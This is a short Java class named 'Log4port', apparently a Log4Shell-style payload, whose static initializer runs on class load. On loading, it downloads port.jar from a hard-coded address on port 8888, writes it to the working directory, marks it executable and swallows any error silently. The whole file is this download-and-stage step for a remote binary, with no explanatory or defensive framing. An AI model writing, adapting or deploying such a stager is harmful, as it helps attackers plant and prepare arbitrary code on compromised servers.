import java.io.InputStream;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.net.URL;


public class Log4port {
    static {
        String url = "http://10.8.104.07:8888/port.jar";
        String filename = "./port.jar";
        try {
            InputStream in = new URL(url).openStream();
            Files.copy(in, Paths.get(filename), StandardCopyOption.REPLACE_EXISTING);

            File file = new File(filename);

            if(file.exists()){
              file.setReadable(true);
              file.setExecutable(true);
              file.setWritable(false);
            }
        } catch (Exception e) {
        }
    }
}
